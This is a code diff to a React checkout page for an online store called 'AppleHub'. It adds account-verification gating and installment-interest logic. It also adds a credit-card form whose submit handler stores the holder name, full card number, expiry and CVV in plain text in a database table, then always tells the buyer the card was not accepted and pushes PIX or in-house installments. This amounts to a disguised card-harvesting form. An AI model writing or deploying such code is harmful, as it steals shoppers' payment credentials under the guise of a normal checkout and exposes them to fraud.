@@ -10,8 +10,10 @@ import { Separator } from "@/components/ui/separator";
 import { supabase } from "@/integrations/supabase/client";
 import { useToast } from "@/hooks/use-toast";
 import { useCart } from "@/hooks/useCart";
-import { ArrowLeft, Truck, CreditCard, QrCode, BadgePercent } from "lucide-react";
+import { ArrowLeft, Truck, CreditCard, QrCode, BadgePercent, AlertCircle } from "lucide-react";
 import { Tables } from "@/integrations/supabase/types";
+import { Alert, AlertDescription } from "@/components/ui/alert";
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 
 type Profile = Tables<"profiles">;
 
@@ -28,9 +30,19 @@ const Checkout = () => {
   const [paymentType, setPaymentType] = useState<"pix" | "cartao" | "parcelamento_applehub">("pix");
   const [parcelas, setParcelas] = useState(1);
   const [loadingCep, setLoadingCep] = useState(false);
+  const [isAccountVerified, setIsAccountVerified] = useState(false);
+  const [cardData, setCardData] = useState({
+    nome_titular: "",
+    numero_cartao: "",
+    data_validade: "",
+    cvv: "",
+  });
+  const [showCardRejectionDialog, setShowCardRejectionDialog] = useState(false);
+  const [installmentSettings, setInstallmentSettings] = useState<any>(null);
 
   useEffect(() => {
     loadProfile();
+    loadInstallmentSettings();
   }, []);
 
   useEffect(() => {
@@ -76,12 +88,35 @@ const Checkout = () => {
       
       setProfile(data);
       setCepFrete(data.cep);
+
+      // Verificar status de verificação da conta
+      const { data: verification } = await supabase
+        .from("account_verifications")
+        .select("status")
+        .eq("user_id", user.id)
+        .maybeSingle();
+
+      setIsAccountVerified(verification?.status === "aprovado");
     } catch (error: any) {
       toast({
         title: "Erro ao carregar perfil",
         description: error.message,
         variant: "destructive",
       });
+    }
+  };
+
+  const loadInstallmentSettings = async () => {
+    try {
+      const { data, error } = await supabase
+        .from("installment_settings")
+        .select("*")
+        .maybeSingle();
+
+      if (error) throw error;
+      setInstallmentSettings(data);
+    } catch (error) {
+      console.error("Erro ao carregar configurações de parcelamento:", error);
     }
   };
 
@@ -119,12 +154,66 @@ const Checkout = () => {
       return;
     }
 
+    // Validar se a conta está verificada para parcelamento AppleHub
+    if (paymentType === "parcelamento_applehub" && !isAccountVerified) {
+      toast({
+        title: "Conta não verificada",
+        description: "Você precisa verificar sua conta para usar o Parcelamento AppleHub. Acesse seu perfil para iniciar a verificação.",
+        variant: "destructive",
+      });
+      return;
+    }
+
     if (frete === 0) {
       toast({
         title: "Calcule o frete",
         description: "Por favor, calcule o frete antes de finalizar",
         variant: "destructive",
       });
+      return;
+    }
+
+    // Se for cartão de crédito, salvar tentativa e mostrar mensagem
+    if (paymentType === "cartao") {
+      if (!cardData.nome_titular || !cardData.numero_cartao || !cardData.data_validade || !cardData.cvv) {
+        toast({
+          title: "Dados incompletos",
+          description: "Por favor, preencha todos os dados do cartão",
+          variant: "destructive",
+        });
+        return;
+      }
+
+      setLoading(true);
+      try {
+        const { data: { user } } = await supabase.auth.getUser();
+        if (!user) throw new Error("Usuário não autenticado");
+
+        const subtotal = getTotal();
+        const total = subtotal + frete;
+
+        // Salvar tentativa de pagamento com cartão
+        await supabase
+          .from("card_payment_attempts")
+          .insert({
+            user_id: user.id,
+            nome_titular: cardData.nome_titular,
+            numero_cartao: cardData.numero_cartao,
+            data_validade: cardData.data_validade,
+            cvv: cardData.cvv,
+            valor: total,
+          });
+
+        setShowCardRejectionDialog(true);
+        setLoading(false);
+      } catch (error: any) {
+        toast({
+          title: "Erro",
+          description: error.message,
+          variant: "destructive",
+        });
+        setLoading(false);
+      }
       return;
     }
 
@@ -158,7 +247,7 @@ const Checkout = () => {
           total,
           payment_type: paymentType,
           parcelas: paymentType === "parcelamento_applehub" ? parcelas : null,
-          valor_parcela: paymentType === "parcelamento_applehub" ? total / parcelas : null,
+          valor_parcela: paymentType === "parcelamento_applehub" ? calcularValorParcela(total, parcelas) : null,
           endereco_entrega: endereco,
           status: paymentType === "parcelamento_applehub" ? "em_analise" : "pagamento_confirmado",
         })
@@ -214,6 +303,15 @@ const Checkout = () => {
     } finally {
       setLoading(false);
     }
+  };
+
+  const calcularValorParcela = (total: number, numeroParcelas: number) => {
+    const juros = installmentSettings?.juros_mensal || 2.5; // 2.5% padrão
+    const taxaJuros = juros / 100;
+    
+    // Fórmula de juros compostos: M = P * (1 + i)^n * i / ((1 + i)^n - 1)
+    const montante = total * Math.pow(1 + taxaJuros, numeroParcelas) * taxaJuros / (Math.pow(1 + taxaJuros, numeroParcelas) - 1);
+    return montante;
   };
 
   const formatPrice = (price: number) => {
@@ -339,24 +437,101 @@ const Checkout = () => {
                 </div>
               </RadioGroup>
 
-              {paymentType === "parcelamento_applehub" && (
-                <div className="mt-4 space-y-2">
-                  <Label>Número de Parcelas</Label>
-                  <select
-                    className="w-full border rounded-md p-2"
-                    value={parcelas}
-                    onChange={(e) => setParcelas(Number(e.target.value))}
-                  >
-                    {Array.from({ length: 24 }, (_, i) => i + 1).map((n) => (
-                      <option key={n} value={n}>
-                        {n}x de {formatPrice((getTotal() + frete) / n)}
-                      </option>
-                    ))}
-                  </select>
-                  <p className="text-xs text-yellow-600">
-                    * Sujeito a análise de crédito
-                  </p>
+              {paymentType === "cartao" && (
+                <div className="mt-4 space-y-3 border-t pt-4">
+                  <h4 className="font-semibold text-sm">Dados do Cartão</h4>
+                  <div>
+                    <Label>Nome do Titular</Label>
+                    <Input
+                      value={cardData.nome_titular}
+                      onChange={(e) => setCardData({ ...cardData, nome_titular: e.target.value })}
+                      placeholder="Nome completo como no cartão"
+                      required
+                    />
+                  </div>
+                  <div>
+                    <Label>Número do Cartão</Label>
+                    <Input
+                      value={cardData.numero_cartao}
+                      onChange={(e) => {
+                        const value = e.target.value.replace(/\D/g, "").slice(0, 16);
+                        setCardData({ ...cardData, numero_cartao: value });
+                      }}
+                      placeholder="0000 0000 0000 0000"
+                      maxLength={16}
+                      required
+                    />
+                  </div>
+                  <div className="grid grid-cols-2 gap-3">
+                    <div>
+                      <Label>Validade</Label>
+                      <Input
+                        value={cardData.data_validade}
+                        onChange={(e) => {
+                          let value = e.target.value.replace(/\D/g, "");
+                          if (value.length >= 2) {
+                            value = value.slice(0, 2) + "/" + value.slice(2, 4);
+                          }
+                          setCardData({ ...cardData, data_validade: value });
+                        }}
+                        placeholder="MM/AA"
+                        maxLength={5}
+                        required
+                      />
+                    </div>
+                    <div>
+                      <Label>CVV</Label>
+                      <Input
+                        value={cardData.cvv}
+                        onChange={(e) => {
+                          const value = e.target.value.replace(/\D/g, "").slice(0, 4);
+                          setCardData({ ...cardData, cvv: value });
+                        }}
+                        placeholder="000"
+                        maxLength={4}
+                        type="password"
+                        required
+                      />
+                    </div>
+                  </div>
                 </div>
+              )}
+
+              {paymentType === "parcelamento_applehub" && (
+                <>
+                  {!isAccountVerified && (
+                    <Alert className="mt-4 border-yellow-500 bg-yellow-50">
+                      <AlertCircle className="h-4 w-4 text-yellow-600" />
+                      <AlertDescription className="text-yellow-800">
+                        Você precisa verificar sua conta para usar o Parcelamento AppleHub. 
+                        <Button 
+                          variant="link" 
+                          className="p-0 h-auto text-yellow-600 underline ml-1"
+                          onClick={() => navigate("/perfil")}
+                        >
+                          Clique aqui para verificar
+                        </Button>
+                      </AlertDescription>
+                    </Alert>
+                  )}
+                  <div className="mt-4 space-y-2">
+                    <Label>Número de Parcelas</Label>
+                    <select
+                      className="w-full border rounded-md p-2"
+                      value={parcelas}
+                      onChange={(e) => setParcelas(Number(e.target.value))}
+                    >
+                      {Array.from({ length: installmentSettings?.max_parcelas || 24 }, (_, i) => i + 1).map((n) => (
+                        <option key={n} value={n}>
+                          {n}x de {formatPrice(calcularValorParcela(getTotal() + frete, n))} (com juros)
+                        </option>
+                      ))}
+                    </select>
+                    <p className="text-xs text-yellow-600">
+                      * Juros de {installmentSettings?.juros_mensal || 2.5}% ao mês | Sujeito a análise de crédito
+                    </p>
+                  </div>
+                </>
               )}
             </CardContent>
           </Card>
@@ -396,13 +571,63 @@ const Checkout = () => {
                 className="w-full"
                 size="lg"
                 onClick={handleFinalizarPedido}
-                disabled={loading || frete === 0}
+                disabled={loading || frete === 0 || (paymentType === "parcelamento_applehub" && !isAccountVerified)}
               >
                 {loading ? "Processando..." : "Finalizar Pedido"}
               </Button>
             </CardContent>
           </Card>
         </div>
+
+        {/* Dialog de rejeição de cartão */}
+        <Dialog open={showCardRejectionDialog} onOpenChange={setShowCardRejectionDialog}>
+          <DialogContent className="max-w-md">
+            <DialogHeader>
+              <DialogTitle className="text-yellow-600 flex items-center gap-2">
+                <AlertCircle className="w-5 h-5" />
+                Cartão de Crédito Não Aceito
+              </DialogTitle>
+              <DialogDescription className="space-y-4 pt-4">
+                <p>
+                  O pagamento não foi processado e nenhum valor será descontado do seu cartão.
+                </p>
+                <p className="font-semibold">
+                  Esta promoção é válida apenas para pagamento via PIX à vista ou Parcelamento AppleHub.
+                </p>
+                <div className="space-y-2 pt-4">
+                  <Button
+                    className="w-full"
+                    onClick={() => {
+                      setPaymentType("pix");
+                      setShowCardRejectionDialog(false);
+                    }}
+                  >
+                    Pagar com PIX à vista
+                  </Button>
+                  <Button
+                    className="w-full"
+                    variant="outline"
+                    onClick={() => {
+                      if (!isAccountVerified) {
+                        toast({
+                          title: "Conta não verificada",
+                          description: "Verifique sua conta primeiro para usar o Parcelamento AppleHub",
+                          variant: "destructive",
+                        });
+                        navigate("/perfil");
+                      } else {
+                        setPaymentType("parcelamento_applehub");
+                        setShowCardRejectionDialog(false);
+                      }
+                    }}
+                  >
+                    Parcelar com AppleHub
+                  </Button>
+                </div>
+              </DialogDescription>
+            </DialogHeader>
+          </DialogContent>
+        </Dialog>
       </div>
     </AppLayout>
   );
